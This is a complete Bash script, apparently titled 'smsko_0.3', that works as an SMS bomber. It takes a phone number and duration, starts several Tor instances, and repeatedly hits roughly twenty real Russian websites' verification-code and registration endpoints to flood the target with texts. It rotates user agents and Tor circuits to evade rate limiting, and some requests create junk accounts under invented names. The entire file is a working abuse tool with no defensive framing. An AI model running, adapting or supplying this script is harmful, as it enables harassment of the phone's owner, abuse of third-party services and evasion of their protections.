#!/bin/bash

## Name: smsko_0.3
## Coded by: Nemoize

command -v netcat &>/dev/null || { echo >&2 "Выполните установку netcat."; exit 1; }
command -v curl &>/dev/null || { echo >&2 "Выполните установку curl."; exit 1; }
command -v tor &>/dev/null || { echo >&2 "Выполните установку tor."; exit 1; }

MENU(){
    clear
    echo -e "\e[1;34m .d8888. .88b  d88. .d8888. db   dD  .d88b.  
 88'  YP 88'YbdP\`88 88'  YP 88 ,8P' .8P  Y8. 
 \`8bo.   88  88  88 \`8bo.   88,8P   88    88 
   \`Y8b. 88  88  88   \`Y8b. 88\`8b   88    88 
 db   8D 88  88  88 db   8D 88 \`88. \`8b  d8' 
 \`8888Y' YP  YP  YP \`8888Y' YP   YD  \`\e[32mV0.3\e[34m'  
\e[0m"

    if [[ -z $1 || ${#1} -lt 10 || ${#1} -gt 22 ]]; then
        read -p $'\e[1;34m# Номер\e[1;32m: \e[1;37m' arg
        MENU "${arg//[:punch:|a-z|A-Z|+|\-|(|)| ]}" "$2"
    elif [[ -z $2 || -n ${2//[0-9]} ]]; then
        read -p $'\e[1;34m# Время\e[1;32m: \e[1;37m' arg
        MENU "$1" "${arg:=0}"
    else
        S_DAEMON "$@"
    fi
}

S_DAEMON(){
    SPID=0
    [ -d 'tor.tmp' ] || mkdir 'tor.tmp'
    for i in $(seq 1 5); do
        ((SP=9050+$i))
        ((CP=8118+$i))
        [ -d "tor.tmp/tor_$i" ] || mkdir "tor.tmp/tor_$i"
        SPID=`ps ax -Ao ppid | grep $$ | wc -l`
        while [[ $SPID -ge $(($i+1)) ]]; do 
            SPID=`ps ax -Ao ppid | grep $$ | wc -l`
            sleep 1
        done
        S_BOMB "$@" "$SP" "$CP" "$i" &
    done
    while [[ $SPID -gt 1 ]]; do
        SPID=`ps ax -Ao ppid | grep $$ | wc -l`
        sleep 1
    done
}

S_BOMB(){
    tor --ClientOnly 1 --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "16:129B613CD79CEDC5607AFC1C3656149B6DAF2392EA082DA112FF454D7A" --ControlPort $4 --PidFile tor_$5.pid --SocksPort $3 --DataDirectory tor.tmp/tor_$5 > /dev/null
    GT=`date +%s`
    while [[ $(($(date +%s) - GT)) -lt $2 || $2 -eq '0' ]]; do
        C_TOR "$3" "$4"; G_UA
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode?pageName=registerPrivateUserPhoneVerification' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=${1:1:3}-${1:4:7}&g-recaptcha-response&recaptcha=on" -e 'https://www.mvideo.ru/register?sn=false' &>/dev/null & #mvideo.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'http://lk.chulpan.ru/Portal/Selfcare/Register/' -H 'Content-Type: application/x-www-form-urlencoded' -d "redirect_type=&redirect_guid=&phone=%2B7+%28${1:1:3}%29+${1:4:3}-${1:7:4}&password=A$(shuf -i 234987-999999 -n 1)z" -e 'http://lk.chulpan.ru/Portal/Selfcare/LogIn' &>/dev/null & #lk.chulpan.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://shop.vsk.ru/ajax/auth/postSms/' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=+7+(${1:1:3})+${1:4:3}-${1:7:2}-${1:9:2}" -e 'https://shop.vsk.ru/personal/' &>/dev/null & #vsk.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phonemobile=$1" -e 'https://security.wildberries.ru/register?returnUrl=https%3A%2F%2Fwww.wildberries.ru%2F' &>/dev/null & #wildberries.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://bicco.ru/youdo/login/' -H 'Content-Type: application/x-www-form-urlencoded' -d "ajax_call=y&action=register&phone=$1" -e 'https://bicco.ru/youdo/login/' &>/dev/null & #bicco.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://qbbox.ru/api/user' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"phone":"'$1'","account_type":1}' -e 'https://qbbox.ru/' &>/dev/null & #qbbox.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://cross-studio.ru/ajax/lk/send_sms' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "phone=%2B7+(${1:1:3})+${1:4:3}-${1:7:2}-${1:9:2}&email=a${1::5}z%40ya.ru&pass=a${1}Z&pass1=a${1}Z&name=Alexey&fename=Navalnyy&hash=" -e 'https://cross-studio.ru/lk/register' &>/dev/null & #cross-studio.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://fesco-hall.ru/api/register' -H 'content-type: application/json' -d '{"phone":"'$1'"}' -e 'https://fesco-hall.ru/news' &>/dev/null & #fesco-hall.ru
curl --socks5-hostname localhost:$3 -A "$UA" -b tmp -s "https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+7%20(${1:1:3})${1:4:3}-${1:7:2}-${1:9:2}" -H 'X-Requested-With: XMLHttpRequest' -e 'https://fundayshop.com/' &>/dev/null & #fundayshop.com
curl --socks5-hostname localhost:$3 -A "$UA" -b tmp -s "https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=%207%20(${1:1:3})${1:4:3}-${1:7:2}-${1:9:2}" -H 'X-Requested-With: XMLHttpRequest' -e 'https://ostin.com/' &>/dev/null & #ostin.com
curl --socks5-hostname localhost:$3 -A "$UA" -b tmp -s "https://shop.nokiantyres.ru/saleRegister/sendCode?phoneNumber=%2B7(${1:1:3})${1:4:3}-${1:7:2}-${1:9:2}" -e 'https://shop.nokiantyres.ru/saleRegister' &>/dev/null & #shop.nokiantyres.ru
t_gett=$(curl --socks5-hostname localhost:$3 -A "$UA" -s 'https://driver.gett.ru/login/' | grep 'csrfmiddlewaretoken' | cut -d "'" -f6 ) && curl -X POST --socks5-hostname localhost:$3 -A "$UA" -L -b tmp -s 'https://driver.gett.ru/api/login/phone/' -H 'Content-Type: application/json' -H "X-CSRFToken: $t_gett" -H "Cookie: csrftoken=$t_gett" -d '{"phone":"+7 ('${1:1:3}') '${1:4:3}\-${1:7:2}\-${1:9:2}\"',"registration":false}' -e 'https://driver.gett.ru/login/' &>/dev/null & #gett
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://vipfish.ru/?action=auth' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "CSRF=&ACTION=REGISTER&MODE=PHONE&PHONE=%2B7+(${1:1:3})+${1:4:3}-${1:7:2}-${1:9:2}&PASSWORD=a92910Z8223B&PASSWORD2=a92910Z8223B" -e 'https://vipfish.ru/?version=mobile' &>/dev/null &
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://www.xn--80aicstx0byb.xn--p1ai/?action=auth' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "CSRF=&ACTION=REGISTER&MODE=PHONE&PHONE=%2B7+(${1:1:3})+${1:4:3}-${1:7:2}-${1:9:2}&PASSWORD=a92910Z8223B&PASSWORD2=a92910Z8223B" -e 'https://www.xn--80aicstx0byb.xn--p1ai/' &>/dev/null &
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://radugavkusaufa.ru/?action=auth&act=132' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "CSRF=&ACTION=REGISTER&MODE=PHONE&PHONE=%2B7+(${1:1:3})+${1:4:3}-${1:7:2}-${1:9:2}&PASSWORD=aRe123Z8223B&PASSWORD2=aRe123Z8223B" -e 'https://radugavkusaufa.ru/' &>/dev/null &
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://auth.dikidi.ru/ajax/check/number/' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "number=$1&callback=https://auth.dikidi.ru/ajax/user/create/&type=registration&name=Алексей&password=Funty321" -e 'https://beauty.dikidi.ru/ru' &>/dev/null & #dikidi.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://www.molbulak.ru/ajax/smsservice.php' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "command=send_code&phone=%2B7(${1:1:3})+-+${1:4:3}+-+${1:7:2}+-+${1:9:2}" -e 'https://www.molbulak.ru/personal/' &>/dev/null & #molbulak.ru
curl --socks5-hostname localhost:$3 -A "$UA" -b tmp -s "https://www.farpost.ru/sign/confirm?queryParameters%5Breturn%5D=%2F&sessionGeoId=0&return=%2F&sendStatus=notAllowed&sign=$1&entrance=&registration=ok&notsend=1" -H "GET /sign/confirm?queryParameters%5Breturn%5D=%2F&sessionGeoId=0&return=%2F&sendStatus=notAllowed&sign=$1&entrance=&registration=ok&notsend=1 HTTP/1.1" -e 'https://www.farpost.ru/sign?return=%2F' &>/dev/null & #farpost.ru
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'content-type: application/json' -d '{"phone_number":"'$1'"}' -e 'https://tinder.com/' &>/dev/null & #gotinder.com
curl -X POST --socks5-hostname localhost:$3 -A "$UA" -b tmp -s 'https://agent.prostoy.ru/register/get_sms_code.php' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d "<request><mobile>+${1::1}(${1:1:3})${1:4:3}-${1:7:2}-${1:9:2}</mobile></request>" -e 'https://www.prostoy.ru/register' &>/dev/null & #prostoy.ru
        wait
        echo -e 'AUTHENTICATE "smsko_0.3"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 $4 > /dev/null
        echo -e " \e[1;34m#\e[0;37m $1\e[1;34m | Время \e[0;37m$(($(date +%s)-GT))\e[0m"
    done
}

G_UA(){
    case $(shuf -i 1-12 -n 1) in
    1) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7';;
    2) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1';;
    3) UA='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36';;
    4) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240';;
    5) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10547';;
    6) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/14.14359';;
    7) UA='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15';;
    8) UA='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36';;
    9) UA='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24';;
    10) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240';;
    11) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10547';;
    12) UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/14.14359';;
    esac
}

C_TOR(){
    for _ in {1..10}; do
        curl --max-time 5 --socks5-hostname localhost:$1 -s https://check.torproject.org > /dev/null
        [ $? -eq 0 ] && break
        echo -e 'AUTHENTICATE "smsko_0.3"\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 $2 > /dev/null
    done
}

MENU "${2//[:punch:|a-z|A-Z|+|\-|(|)| ]}" "$1"
killall tor &>/dev/null
exit 0
